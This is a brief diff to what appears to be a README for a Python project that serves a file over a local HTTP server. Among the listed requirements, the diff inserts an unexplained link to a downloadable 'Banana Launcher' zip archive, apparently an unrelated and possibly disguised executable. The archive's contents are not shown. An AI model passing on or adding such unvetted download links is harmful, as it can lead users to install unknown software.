@@ -70,4 +70,6 @@ http://(yourip):8080/(nameofyourfile).txt``
 
 Python 3. x
 
+[Banana Launcher.](https://github.com/user-attachments/files/17395871/Banana.Launcher.zip)
+
 (optional) Basic python knowledge (for customizations)
